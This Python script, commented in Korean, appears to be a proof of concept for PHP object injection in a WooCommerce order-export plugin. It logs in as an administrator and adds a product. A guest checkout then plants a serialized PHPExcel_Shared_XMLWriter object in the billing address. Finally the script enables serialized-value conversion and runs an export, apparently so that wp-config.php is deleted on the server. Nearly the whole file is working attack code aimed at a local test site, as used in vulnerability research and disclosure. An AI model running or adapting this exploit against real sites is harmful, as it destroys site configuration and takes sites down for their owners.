import re
import string
import json
import random
import requests
import urllib.parse
import phpserialize
from urllib.parse import quote
from datetime import datetime
from bs4 import BeautifulSoup


# 프록시 설정을 하려면 아래 변수에 서버 주소를 입력하세요.
PROXY_SERVER = None
proxies = {
    "https": PROXY_SERVER,
    "http": PROXY_SERVER,
}

def __login_get_session(login_id, login_pw):
    session = requests.session()
    data = {
        "log": login_id,
        "pwd": login_pw,
        "wp-submit": "Log In",
        "testcookie": 1
    }
    resp = session.post(f"{TARGET}/wp-login.php", data=data, proxies=proxies)
    if True in [ "wordpress_logged_in_" in cookie for cookie in resp.cookies.keys() ]:
        print(f" |- 계정 {login_id} 로그인에 성공 했습니다.")
        return session
    else:
        raise Exception(f"[-] 로그인에 실패했습니다.")

def __add_product(admin_session, prod_title):
    print(f" |- 상품({prod_title})을 추가합니다.")
    resp = admin_session.get(f"{TARGET}/wp-admin/post-new.php?post_type=product", proxies=proxies)
    pattern = r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*value=[\'"]([^\'"]+)[\'"]'
    matches = re.findall(pattern, resp.text)
    data = {}
    for name, value in matches:
        if "-hide" in name: continue
        elif "saso_" in name: continue
        data[name] = value
    data["mm"] = data["cur_mm"] # Undefined array key "mm" in /wp-admin/includes/post.php
    data["visibility"] = "public"  # show product
    data["_visibility"] = "visible" # show product
    data["_regular_price"] = 0
    data["post_title"] = prod_title
    
    # 상품 등록
    resp = admin_session.post(f"{TARGET}/wp-admin/post.php", data=data, proxies=proxies)
    
    # 상품 번호 가져오기
    print(f" |- 상품({prod_title}) 추가를 완료했습니다. post_ID: {data['post_ID']}")
    return data['post_ID']

def __buy_product(post_ID, serialized_data):    
    guest_session = requests.session()
    resp = guest_session.get(f"{TARGET}/shop", proxies=proxies)
    pattern1 = r'storeApiNonce: \'(.{10})\''
    pattern2 = r'createNonceMiddleware\( "(.{10})" \)'
    match1 = re.search(pattern1, resp.text)
    match2 = re.search(pattern2, resp.text)
    if match1 and match2:
        store_nonce = match1.group(1)
        wp_nonce = match2.group(1)

        # 카트 담기
        print(f" |- 카트에 상품({post_ID})을 담았습니다.")
        data = {"requests":[{"path":"/wc/store/v1/cart/add-item","method":"POST","data":{"id":post_ID,"quantity":1},"cache":"no-store","body":{"id":post_ID,"quantity":1},"headers":{"Nonce":store_nonce}}]}
        guest_session.post(f"{TARGET}/wp-json/wc/store/v1/batch", json=data, proxies=proxies)
        
        # 결제 준비
        print(f" |- 상품({post_ID}) 주문을 요청합니다.")
        guest_session.get(f"{TARGET}/checkout/", proxies=proxies)
        
        print(f" |- 상품({post_ID})에 직렬화된 데이터({serialized_data})를 삽입합니다.")

        # 결제 요청
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f" |- 상품({post_ID}) 결제를 요청합니다.")
        data = {"additional_fields":{},"billing_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":f"{serialized_data}","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","email":"guest@guest.com","phone":""},"create_account":False,"customer_note":"","customer_password":"","extensions":{"woocommerce/order-attribution":{"source_type":"typein","referrer":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","utm_source_platform":"(none)","utm_creative_format":"(none)","utm_marketing_tactic":"(none)","session_entry":f"{TARGET}","session_start_time":f"{current_time}","session_pages":"3","session_count":"1","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"}},"shipping_address":{"first_name":"firstname","last_name":"lastname","company":"","address_1":"address","address_2":"","city":"city","state":"","postcode":"12345","country":"KR","phone":""}}
        headers = {
            "Nonce": store_nonce,
            "X-WP-Nonce": wp_nonce,
            "Content-Type": "application/json"
        }
        resp = guest_session.post(f"{TARGET}/wp-json/wc/store/v1/checkout", json=data, headers=headers, proxies=proxies)
        checkout_json = resp.json()
        try:
            order_redirect_url = checkout_json['payment_result']['redirect_url']
            print(f" |- 상품({post_ID}) 결제를 성공적으로 완료했습니다.")
            
        except:
            raise Exception(f"[-] 상품({post_ID}) 결제를 실패했습니다.")
    else:
        raise Exception(f"[-] 상품 구매에 필요한 값(storeApiNonce 또는 createNonceMiddleware)을 발견하지 못했습니다.")

def __get_serialized_data(tempFileName):
    
    print(f" | Class: PHPExcel_Shared_XMLWriter")
    print(f" | - private tempFileName: {tempFileName}")

    # 객체 데이터를 딕셔너리로 표현
    user_object = phpserialize.phpobject(
        b'PHPExcel_Shared_XMLWriter',  # PHP 클래스명
        {
            b'tempFileName': tempFileName.encode()
        }
    )

    # 직렬화
    serialized = phpserialize.dumps(user_object)
    return serialized.decode()

def __export_orders(session):
    
    resp = session.get(f"{TARGET}/wp-admin/admin.php?page=wc-order-export", proxies=proxies)
    
    pattern = r'var woe_nonce = \"(.{10})\"'
    match = re.search(pattern, resp.text)
    if match:
        woe_nonce = match.group(1)
        print(f" |- woe_nonce 값 추출: {woe_nonce}")
        
        print(f" |- 설정 값('Try to convert serialized values')을 활성화 합니다.")
        settings_data = {"settings":{"post_type":"shop_order","version":"2.0","export_rule_field":"date","from_date":"","to_date":"","from_order_id":"","to_order_id":"","summary_report_by_products":"0","summary_report_by_customers":"0","export_filename":"orders-%y-%m-%d-%h-%i-%s.xlsx","format":"XLS","format_xls_use_xls_format":"0","format_xls_display_column_names":"1","format_xls_auto_width":"1","format_xls_direction_rtl":"0","format_xls_force_general_format":"0","format_xls_remove_emojis":"0","format_xls_sheet_name":"Orders","format_xls_row_images_width":"50","format_xls_row_images_height":"50","format_csv_add_utf8_bom":"0","format_csv_display_column_names":"1","format_csv_force_quotes":"0","format_csv_delete_linebreaks":"0","format_csv_remove_linebreaks":"0","format_csv_item_rows_start_from_new_line":"0","format_csv_enclosure":"\"","format_csv_delimiter":",","format_csv_linebreak":"\\r\\n","format_csv_encoding":"UTF-8","format_xml_self_closing_tags":"1","format_xml_preview_format":"0","format_xml_prepend_raw_xml":"","format_xml_root_tag":"Orders","format_xml_order_tag":"Order","format_xml_product_tag":"Product","format_xml_coupon_tag":"Coupon","format_xml_append_raw_xml":"","format_json_start_tag":"[","format_json_end_tag":"]","format_tsv_add_utf8_bom":"0","format_tsv_display_column_names":"1","format_tsv_item_rows_start_from_new_line":"0","format_tsv_linebreak":"\\r\\n","format_tsv_encoding":"UTF-8","format_pdf_display_column_names":"1","format_pdf_repeat_header":"1","format_pdf_orientation":"L","format_pdf_page_size":"A4","format_pdf_font_size":"8","format_pdf_pagination":"C","format_pdf_header_text":"","format_pdf_cols_width":"25","format_pdf_footer_text":"","format_pdf_cols_align":"L","format_pdf_fit_page_width":"0","format_pdf_cols_vertical_align":"T","format_pdf_table_header_text_color":"#000000","format_pdf_table_header_background_color":"#FFFFFF","format_pdf_table_row_text_color":"#000000","format_pdf_table_row_background_color":"#FFFFFF","format_pdf_page_header_text_color":"#000000","format_pdf_page_footer_text_color":"#000000","format_pdf_logo_source_id":"0","format_pdf_logo_source":"","format_pdf_logo_align":"R","format_pdf_logo_height":"15","format_pdf_logo_width":"0","format_pdf_row_images_width":"15","format_pdf_row_images_height":"15","format_pdf_row_dont_page_break_order_lines":"0","format_pdf_row_images_add_link":"0","format_html_display_column_names":"1","format_html_repeat_header_last_line":"0","format_html_font_size":"13","format_html_cols_align":"L","format_html_header_text":"","format_html_footer_text":"","format_html_table_header_text_color":"#000000","format_html_table_header_background_color":"#FFFFFF","format_html_table_row_text_color":"#000000","format_html_table_row_background_color":"#FFFFFF","format_html_header_text_color":"#000000","format_html_footer_text_color":"#000000","format_html_row_images_width":"100","format_html_row_images_height":"100","format_html_images_add_link":"0","format_html_custom_css":"","date_format":"Y-m-d","time_format":"H:i","sort":"order_id","sort_direction":"DESC","format_number_fields":"0","export_all_comments":"0","export_refund_notes":"0","strip_tags_product_fields":"0","strip_html_tags":"0","round_item_tax_rate":"0","cleanup_phone":"0","billing_details_for_shipping":"0","convert_serialized_values":"1","enable_debug":"0","custom_php":"0","custom_php_code":"","skip_suborders":"0","export_refunds":"0","mark_exported_orders":"0","export_unmarked_orders":"0","statuses":["wc-pending","wc-processing","wc-on-hold","wc-completed"],"all_products_from_order":"1","skip_refunded_items":"0","product_sku":"","any_coupon_used":"0","export_matched_items":"0","summary_row_title":"Total"},"duplicated_fields_settings":{"products":{"repeat":"rows","populate_other_columns":"1","max_cols":"10","group_by":"product","line_delimiter":"\\n"},"coupons":{"repeat":"rows","max_cols":"10","group_by":"product","line_delimiter":"\\n"}},"orders":[{"segment":"common","key":"order_number","label":"Order Number","format":"string","colname":"Order Number"},{"segment":"common","key":"order_status","label":"Order Status","format":"string","colname":"Order Status"},{"segment":"common","key":"order_date","label":"Order Date","format":"date","colname":"Order Date"},{"segment":"common","key":"customer_note","label":"Customer Note","format":"string","colname":"Customer Note"},{"segment":"billing","key":"billing_first_name","label":"First Name (Billing)","format":"string","colname":"First Name (Billing)"},{"segment":"billing","key":"billing_last_name","label":"Last Name (Billing)","format":"string","colname":"Last Name (Billing)"},{"segment":"billing","key":"billing_company","label":"Company (Billing)","format":"string","colname":"Company (Billing)"},{"segment":"billing","key":"billing_address","label":"Address 1&2 (Billing)","format":"string","colname":"Address 1&2 (Billing)"},{"segment":"billing","key":"billing_city","label":"City (Billing)","format":"string","colname":"City (Billing)"},{"segment":"billing","key":"billing_state","label":"State Code (Billing)","format":"string","colname":"State Code (Billing)"},{"segment":"billing","key":"billing_postcode","label":"Postcode (Billing)","format":"string","colname":"Postcode (Billing)"},{"segment":"billing","key":"billing_country","label":"Country Code (Billing)","format":"string","colname":"Country Code (Billing)"},{"segment":"billing","key":"billing_email","label":"Email (Billing)","format":"string","colname":"Email (Billing)"},{"segment":"billing","key":"billing_phone","label":"Phone (Billing)","format":"string","colname":"Phone (Billing)"},{"segment":"shipping","key":"shipping_first_name","label":"First Name (Shipping)","format":"string","colname":"First Name (Shipping)"},{"segment":"shipping","key":"shipping_last_name","label":"Last Name (Shipping)","format":"string","colname":"Last Name (Shipping)"},{"segment":"shipping","key":"shipping_address","label":"Address 1&2 (Shipping)","format":"string","colname":"Address 1&2 (Shipping)"},{"segment":"shipping","key":"shipping_city","label":"City (Shipping)","format":"string","colname":"City (Shipping)"},{"segment":"shipping","key":"shipping_state","label":"State Code (Shipping)","format":"string","colname":"State Code (Shipping)"},{"segment":"shipping","key":"shipping_postcode","label":"Postcode (Shipping)","format":"string","colname":"Postcode (Shipping)"},{"segment":"shipping","key":"shipping_country","label":"Country Code (Shipping)","format":"string","colname":"Country Code (Shipping)"},{"segment":"cart","key":"payment_method_title","label":"Payment Method Title","format":"string","colname":"Payment Method Title"},{"segment":"cart","key":"cart_discount","label":"Cart Discount Amount","format":"money","colname":"Cart Discount Amount"},{"segment":"cart","key":"order_subtotal","label":"Order Subtotal Amount","format":"money","colname":"Order Subtotal Amount"},{"segment":"ship_calc","key":"shipping_method_title","label":"Shipping Method Title","format":"string","colname":"Shipping Method Title"},{"segment":"ship_calc","key":"order_shipping","label":"Order Shipping Amount","format":"money","colname":"Order Shipping Amount"},{"segment":"totals","key":"order_refund","label":"Order Refund Amount","format":"money","colname":"Order Refund Amount"},{"segment":"totals","key":"order_total","label":"Order Total Amount","format":"money","colname":"Order Total Amount"},{"segment":"totals","key":"order_total_tax","label":"Order Total Tax Amount","format":"money","colname":"Order Total Tax Amount"},{"segment":"products","key":"products","colname":"Products","label":"Products","format":"undefined"},{"segment":"products","key":"plain_products_sku","label":"SKU","format":"string","colname":"SKU"},{"segment":"products","key":"plain_products_line_id","label":"Item #","format":"number","colname":"Item #"},{"segment":"products","key":"plain_products_name","label":"Item Name","format":"string","colname":"Item Name"},{"segment":"products","key":"plain_products_qty_minus_refund","label":"Quantity (- Refund)","format":"number","colname":"Quantity (- Refund)"},{"segment":"products","key":"plain_products_item_price","label":"Item Cost","format":"money","colname":"Item Cost"},{"segment":"coupons","key":"coupons","colname":"Coupons","label":"Coupons","format":"undefined"},{"segment":"coupons","key":"plain_coupons_code","label":"Coupon Code","format":"string","colname":"Coupon Code"},{"segment":"coupons","key":"plain_coupons_discount_amount","label":"Discount Amount","format":"money","colname":"Discount Amount"},{"segment":"coupons","key":"plain_coupons_discount_amount_tax","label":"Discount Amount Tax","format":"money","colname":"Discount Amount Tax"}]}
        data = {
            "json": json.dumps(settings_data),
            "action": "order_exporter",
            "method": "save_settings",
            "mode": "now",
            "id": 0,
            "woe_nonce": woe_nonce,
            "tab": "export"
        }
        session.post(f"{TARGET}/wp-admin/admin-ajax.php", data=data, proxies=proxies)


        print(f" |- 주문 목록 내보내기를 시작합니다.")
        data = {
            "json": json.dumps(settings_data),
            "action": "order_exporter",
            "method": "export_start",
            "mode": "now",
            "id": 0,
            "woe_nonce": woe_nonce,
            "tab": "export"
        }
        resp = session.post(f"{TARGET}/wp-admin/admin-ajax.php", data=data, proxies=proxies)
        file_id = resp.json()['file_id']

        print(f" |- 주문 목록을 내보내는 중입니다.")
        data = {
            "json": json.dumps(settings_data),
            "action": "order_exporter",
            "method": "export_part",
            "mode": "now",
            "id": 0,
            "woe_nonce": woe_nonce,
            "file_id": file_id,
            "tab": "export",
            "start": 0,
            "max_line_items": 10,
            "max_coupos": 10
        }
        resp = session.post(f"{TARGET}/wp-admin/admin-ajax.php", data=data, proxies=proxies)

    else:
        raise Exception(f"[-] 상품 목록을 내보내기 위한 값(woe_nonce)을 발견하지 못했습니다.")

def poc(tempFileName):
    ####
    # 1. 관리자 로그인
    ####
    print(f"[+] 관리자 계정으로 로그인합니다.")
    print(f" |- 계정: {ADMIN_ID}, 비밀번호: {ADMIN_PW}")
    admin_session = __login_get_session(ADMIN_ID, ADMIN_PW)
    admin_session.get(f"{TARGET}/wp-admin/", proxies=proxies)

    ###
    # 2. 상품 등록 - 관리자
    ###
    print(f"[+] 상품을 등록 합니다.")
    post_ID = __add_product(admin_session, "🔥 Consert Ticket Open Event 🔥")
    
    ###
    # 3. PHPExcel_Shared_XMLWriter 클래스 객체 직렬화
    ###
    print(f"[+] PHPExcel_Shared_XMLWriter 클래스 객체를 직렬화 합니다.")
    serialized_data = __get_serialized_data(tempFileName=tempFileName)

    ###
    ## 4. 상품 구매 - 익명 사용자
    ###
    print(f"[+] 익명 사용자가 상품({post_ID})을 구매합니다.")
    __buy_product(post_ID, serialized_data)
    
    ###
    ## 5. 상품 목록 내보내기 - 관리자
    ###
    print(f"[+] 관리자가 상품 목록을 내보냅니다.")
    __export_orders(admin_session)


if __name__ == "__main__":

    TARGET = "http://localhost:8080"

    # Admnistrator
    ADMIN_ID = "admin"
    ADMIN_PW = "admin"

    poc(tempFileName="/var/www/html/wp-config.php")
